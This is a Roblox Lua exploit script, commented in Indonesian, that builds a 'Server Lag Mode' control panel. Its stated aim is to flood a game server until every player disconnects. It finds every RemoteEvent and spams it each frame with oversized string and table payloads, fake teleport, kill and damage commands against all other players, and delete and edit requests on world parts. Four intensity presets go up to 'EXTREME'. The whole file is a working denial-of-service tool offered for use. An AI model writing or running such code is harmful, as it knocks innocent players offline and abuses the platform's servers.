-- SERVER LAG MODE - NETWORK OVERLOAD
-- Bikin server lag sampai semua disconnect!
-- BAHASA INDONESIA

task.wait(2)

local Players = game:GetService("Players")
local Workspace = game:GetService("Workspace")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui", 10)

if not playerGui then return end

if playerGui:FindFirstChild("LagModeGUI") then
    playerGui.LagModeGUI:Destroy()
    task.wait(0.5)
end

-- ============================================
-- SETTINGS
-- ============================================
local Settings = {
    Intensity = "Medium", -- Low, Medium, High, EXTREME
    Running = false,
    PacketSize = 1000, -- Ukuran data per packet
    Delay = 0.02, -- Delay antar spam
}

local IntensityConfig = {
    Low = {
        packetsPerCycle = 10,
        dataSize = 500,
        delay = 0.05,
        remotesUsed = 5,
    },
    Medium = {
        packetsPerCycle = 25,
        dataSize = 1000,
        delay = 0.02,
        remotesUsed = 10,
    },
    High = {
        packetsPerCycle = 50,
        dataSize = 2000,
        delay = 0.01,
        remotesUsed = 20,
    },
    EXTREME = {
        packetsPerCycle = 100,
        dataSize = 5000,
        delay = 0.005,
        remotesUsed = 999,
    }
}

-- ============================================
-- VARIABLES
-- ============================================
local remotes = {}
local lagConnections = {}
local packetsSent = 0
local startTime = 0

-- ============================================
-- NOTIFICATION
-- ============================================
local function notif(msg, warna)
    local icon = warna == "hijau" and "✅" or (warna == "merah" and "❌" or "⚡")
    pcall(function()
        game:GetService("StarterGui"):SetCore("SendNotification", {
            Title = "Server Lag Mode";
            Text = icon .. " " .. msg;
            Duration = 3;
        })
    end)
    print("[Lag Mode]", msg)
end

-- ============================================
-- SCAN REMOTES
-- ============================================
local function scanRemotes()
    remotes = {}
    
    for _, service in pairs({ReplicatedStorage, Workspace}) do
        pcall(function()
            for _, obj in pairs(service:GetDescendants()) do
                if obj:IsA("RemoteEvent") then
                    table.insert(remotes, obj)
                end
            end
        end)
    end
    
    print("=== REMOTES FOUND ===")
    print("Total:", #remotes)
    print("=====================")
    
    return #remotes
end

-- ============================================
-- LAG METHODS
-- ============================================

-- Method 1: Massive Data Spam
local function massiveDataSpam()
    local config = IntensityConfig[Settings.Intensity]
    
    local connection = RunService.Heartbeat:Connect(function()
        if not Settings.Running then return end
        
        local remotesToUse = math.min(#remotes, config.remotesUsed)
        
        for i = 1, remotesToUse do
            local remote = remotes[i]
            if remote then
                pcall(function()
                    for j = 1, config.packetsPerCycle do
                        -- Kirim data besar
                        local bigData = string.rep("LAG", config.dataSize)
                        remote:FireServer(bigData)
                        
                        -- Kirim table besar
                        local bigTable = table.create(config.dataSize, "OVERLOAD")
                        remote:FireServer(bigTable)
                        
                        packetsSent = packetsSent + 2
                    end
                end)
            end
        end
        
        task.wait(config.delay)
    end)
    
    table.insert(lagConnections, connection)
end

-- Method 2: Multi-Player Target Spam
local function multiPlayerSpam()
    local config = IntensityConfig[Settings.Intensity]
    
    local connection = RunService.Heartbeat:Connect(function()
        if not Settings.Running then return end
        
        local allPlayers = Players:GetPlayers()
        
        for _, targetPlayer in ipairs(allPlayers) do
            if targetPlayer ~= player then
                for i = 1, math.min(#remotes, config.remotesUsed) do
                    local remote = remotes[i]
                    if remote then
                        pcall(function()
                            -- Spam berbagai command ke setiap player
                            for j = 1, config.packetsPerCycle do
                                local randomPos = Vector3.new(
                                    math.random(-99999, 99999),
                                    math.random(-99999, 99999),
                                    math.random(-99999, 99999)
                                )
                                
                                remote:FireServer("TP", targetPlayer, randomPos)
                                remote:FireServer("Teleport", targetPlayer, randomPos)
                                remote:FireServer({Action = "TP", Player = targetPlayer, Pos = randomPos})
                                remote:FireServer("Kill", targetPlayer)
                                remote:FireServer("Damage", targetPlayer, 999999)
                                
                                packetsSent = packetsSent + 5
                            end
                        end)
                    end
                end
            end
        end
        
        task.wait(config.delay)
    end)
    
    table.insert(lagConnections, connection)
end

-- Method 3: Workspace Spam
local function workspaceSpam()
    local config = IntensityConfig[Settings.Intensity]
    
    local connection = RunService.Heartbeat:Connect(function()
        if not Settings.Running then return end
        
        -- Cari semua parts di workspace
        local parts = {}
        for _, obj in pairs(Workspace:GetDescendants()) do
            if obj:IsA("BasePart") and #parts < 100 then
                table.insert(parts, obj)
            end
        end
        
        for i = 1, math.min(#remotes, config.remotesUsed) do
            local remote = remotes[i]
            if remote then
                pcall(function()
                    for _, part in ipairs(parts) do
                        for j = 1, config.packetsPerCycle do
                            -- Spam action ke parts
                            remote:FireServer("Delete", part)
                            remote:FireServer("Edit", part, "Position", Vector3.new(999999, 999999, 999999))
                            remote:FireServer({Action = "Modify", Target = part, Data = string.rep("X", config.dataSize)})
                            
                            packetsSent = packetsSent + 3
                        end
                    end
                end)
            end
        end
        
        task.wait(config.delay)
    end)
    
    table.insert(lagConnections, connection)
end

-- Method 4: Mixed Payload Spam
local function mixedPayloadSpam()
    local config = IntensityConfig[Settings.Intensity]
    
    local connection = RunService.Heartbeat:Connect(function()
        if not Settings.Running then return end
        
        for i = 1, math.min(#remotes, config.remotesUsed) do
            local remote = remotes[i]
            if remote then
                pcall(function()
                    for j = 1, config.packetsPerCycle do
                        -- Mix berbagai jenis payload
                        remote:FireServer(string.rep("NETWORK_OVERLOAD", config.dataSize))
                        remote:FireServer({data = table.create(config.dataSize, "LAG")})
                        remote:FireServer(table.create(100, {nested = string.rep("X", 100)}))
                        
                        -- Spam dengan argument random
                        remote:FireServer(math.random(), math.random(), math.random())
                        remote:FireServer(Vector3.new(math.random(), math.random(), math.random()))
                        
                        packetsSent = packetsSent + 5
                    end
                end)
            end
        end
        
        task.wait(config.delay)
    end)
    
    table.insert(lagConnections, connection)
end

-- ============================================
-- MAIN FUNCTIONS
-- ============================================

local function startLag()
    if Settings.Running then
        notif("Sudah berjalan!", "merah")
        return
    end
    
    Settings.Running = true
    packetsSent = 0
    startTime = tick()
    
    local remoteCount = scanRemotes()
    
    if remoteCount == 0 then
        notif("Tidak ada remote!", "merah")
        Settings.Running = false
        return
    end
    
    notif("🔥 LAG MODE START!", "hijau")
    notif("Intensity: " .. Settings.Intensity, nil)
    notif("Remotes: " .. remoteCount, nil)
    
    print("================================")
    print("SERVER LAG MODE ACTIVATED")
    print("Intensity:", Settings.Intensity)
    print("Remotes:", remoteCount)
    print("Config:", IntensityConfig[Settings.Intensity])
    print("================================")
    
    -- Activate all methods
    task.spawn(massiveDataSpam)
    task.wait(0.1)
    task.spawn(multiPlayerSpam)
    task.wait(0.1)
    task.spawn(workspaceSpam)
    task.wait(0.1)
    task.spawn(mixedPayloadSpam)
    
    notif("💥 Semua method aktif!", "hijau")
    notif("⚠️ Server mulai overload...", nil)
    
    -- Monitor stats
    task.spawn(function()
        while Settings.Running do
            task.wait(5)
            local elapsed = math.floor(tick() - startTime)
            local packetsPerSec = math.floor(packetsSent / math.max(elapsed, 1))
            print(string.format("[Stats] Time: %ds | Packets: %d | Rate: %d/s", elapsed, packetsSent, packetsPerSec))
        end
    end)
end

local function stopLag()
    if not Settings.Running then
        notif("Tidak sedang berjalan!", "merah")
        return
    end
    
    Settings.Running = false
    
    for _, connection in pairs(lagConnections) do
        pcall(function()
            connection:Disconnect()
        end)
    end
    
    lagConnections = {}
    
    local elapsed = math.floor(tick() - startTime)
    notif("⏸️ LAG STOPPED", "hijau")
    notif("Packets sent: " .. packetsSent, nil)
    notif("Duration: " .. elapsed .. "s", nil)
    
    print("================================")
    print("LAG MODE STOPPED")
    print("Total packets sent:", packetsSent)
    print("Duration:", elapsed, "seconds")
    print("================================")
end

local function setIntensity(level)
    if Settings.Running then
        notif("Stop dulu sebelum ganti!", "merah")
        return
    end
    
    Settings.Intensity = level
    notif("Intensity: " .. level, "hijau")
    
    local config = IntensityConfig[level]
    print("=== INTENSITY CONFIG ===")
    print("Level:", level)
    print("Packets per cycle:", config.packetsPerCycle)
    print("Data size:", config.dataSize)
    print("Delay:", config.delay)
    print("Remotes used:", config.remotesUsed)
    print("========================")
end

-- ============================================
-- CREATE GUI
-- ============================================

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "LagModeGUI"
ScreenGui.ResetOnSpawn = false
ScreenGui.Parent = playerGui

local MainFrame = Instance.new("Frame")
MainFrame.Size = UDim2.new(0, 380, 0, 500)
MainFrame.Position = UDim2.new(0.5, -190, 0.5, -250)
MainFrame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
MainFrame.BorderSizePixel = 0
MainFrame.Active = true
MainFrame.Draggable = true
MainFrame.Parent = ScreenGui

local Corner = Instance.new("UICorner")
Corner.CornerRadius = UDim.new(0, 15)
Corner.Parent = MainFrame

-- Header
local Header = Instance.new("Frame")
Header.Size = UDim2.new(1, 0, 0, 55)
Header.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
Header.BorderSizePixel = 0
Header.Parent = MainFrame

local HeaderCorner = Instance.new("UICorner")
HeaderCorner.CornerRadius = UDim.new(0, 15)
HeaderCorner.Parent = Header

local Title = Instance.new("TextLabel")
Title.Size = UDim2.new(1, -70, 1, 0)
Title.Position = UDim2.new(0, 15, 0, 0)
Title.BackgroundTransparency = 1
Title.Text = "🔥 SERVER LAG MODE"
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Font = Enum.Font.GothamBold
Title.TextSize = 20
Title.TextXAlignment = Enum.TextXAlignment.Left
Title.Parent = Header

local CloseBtn = Instance.new("TextButton")
CloseBtn.Size = UDim2.new(0, 50, 0, 50)
CloseBtn.Position = UDim2.new(1, -53, 0, 2.5)
CloseBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 0)
CloseBtn.Text = "✕"
CloseBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseBtn.Font = Enum.Font.GothamBold
CloseBtn.TextSize = 24
CloseBtn.Parent = Header

local CloseBtnCorner = Instance.new("UICorner")
CloseBtnCorner.CornerRadius = UDim.new(0, 10)
CloseBtnCorner.Parent = CloseBtn

CloseBtn.MouseButton1Click:Connect(function()
    stopLag()
    ScreenGui:Destroy()
    notif("GUI ditutup", nil)
end)

-- Content
local Content = Instance.new("Frame")
Content.Size = UDim2.new(1, -30, 1, -70)
Content.Position = UDim2.new(0, 15, 0, 60)
Content.BackgroundTransparency = 1
Content.Parent = MainFrame

-- Intensity Label
local IntensityLabel = Instance.new("TextLabel")
IntensityLabel.Size = UDim2.new(1, 0, 0, 35)
IntensityLabel.Position = UDim2.new(0, 0, 0, 0)
IntensityLabel.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
IntensityLabel.Text = "⚡ PILIH INTENSITY"
IntensityLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
IntensityLabel.Font = Enum.Font.GothamBold
IntensityLabel.TextSize = 16
IntensityLabel.Parent = Content

local IntensityLabelCorner = Instance.new("UICorner")
IntensityLabelCorner.CornerRadius = UDim.new(0, 10)
IntensityLabelCorner.Parent = IntensityLabel

-- Intensity Buttons
local intensityButtons = {}
local intensityLevels = {"Low", "Medium", "High", "EXTREME"}
local intensityColors = {
    Low = Color3.fromRGB(100, 200, 100),
    Medium = Color3.fromRGB(255, 200, 0),
    High = Color3.fromRGB(255, 100, 0),
    EXTREME = Color3.fromRGB(255, 0, 0)
}

for i, level in ipairs(intensityLevels) do
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0.48, 0, 0, 50)
    btn.Position = UDim2.new((i-1) % 2 == 0 and 0 or 0.52, 0, 0, 40 + math.floor((i-1) / 2) * 55)
    btn.BackgroundColor3 = intensityColors[level]
    btn.Text = level
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 16
    btn.Parent = Content
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 10)
    corner.Parent = btn
    
    btn.MouseButton1Click:Connect(function()
        setIntensity(level)
        -- Update visual
        for _, otherBtn in pairs(intensityButtons) do
            otherBtn.BackgroundColor3 = intensityColors[otherBtn.Text]
        end
        btn.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    end)
    
    table.insert(intensityButtons, btn)
end

-- Start Button
local StartBtn = Instance.new("TextButton")
StartBtn.Size = UDim2.new(1, 0, 0, 70)
StartBtn.Position = UDim2.new(0, 0, 0, 160)
StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
StartBtn.Text = "🚀 START LAG"
StartBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StartBtn.Font = Enum.Font.GothamBold
StartBtn.TextSize = 24
StartBtn.Parent = Content

local StartBtnCorner = Instance.new("UICorner")
StartBtnCorner.CornerRadius = UDim.new(0, 12)
StartBtnCorner.Parent = StartBtn

StartBtn.MouseButton1Click:Connect(function()
    startLag()
    StartBtn.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
    StartBtn.Text = "🔥 LAGGING..."
end)

-- Stop Button
local StopBtn = Instance.new("TextButton")
StopBtn.Size = UDim2.new(1, 0, 0, 60)
StopBtn.Position = UDim2.new(0, 0, 0, 240)
StopBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
StopBtn.Text = "⏸️ STOP LAG"
StopBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
StopBtn.Font = Enum.Font.GothamBold
StopBtn.TextSize = 20
StopBtn.Parent = Content

local StopBtnCorner = Instance.new("UICorner")
StopBtnCorner.CornerRadius = UDim.new(0, 12)
StopBtnCorner.Parent = StopBtn

StopBtn.MouseButton1Click:Connect(function()
    stopLag()
    StartBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
    StartBtn.Text = "🚀 START LAG"
end)

-- Info
local Info = Instance.new("TextLabel")
Info.Size = UDim2.new(1, 0, 0, 120)
Info.Position = UDim2.new(0, 0, 1, -120)
Info.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
Info.TextColor3 = Color3.fromRGB(220, 220, 220)
Info.Font = Enum.Font.Gotham
Info.TextSize = 12
Info.TextWrapped = true
Info.TextYAlignment = Enum.TextYAlignment.Top
Info.Text = [[🔥 SERVER LAG MODE

Bikin server overload sampai lag!

INTENSITY:
• Low = Aman (test dulu)
• Medium = Standard
• High = Agresif
• EXTREME = Max power!

⚠️ Semua player akan lag!
📊 Stats di console (F9)

Network overload in progress...]]
Info.Parent = Content

local InfoPadding = Instance.new("UIPadding")
InfoPadding.PaddingTop = UDim.new(0, 10)
InfoPadding.PaddingLeft = UDim.new(0, 10)
InfoPadding.PaddingRight = UDim.new(0, 10)
InfoPadding.Parent = Info

local InfoCorner = Instance.new("UICorner")
InfoCorner.CornerRadius = UDim.new(0, 10)
InfoCorner.Parent = Info

-- Auto scan
task.spawn(function()
    task.wait(1.5)
    local count = scanRemotes()
    notif("Ready! Found " .. count .. " remotes", "hijau")
end)

notif("🔥 Server Lag Mode loaded!", "hijau")
print("================================")
print("SERVER LAG MODE")
print("PlaceId:", game.PlaceId)
print("Default Intensity: Medium")
print("Ready to overload server!")
print("================================")
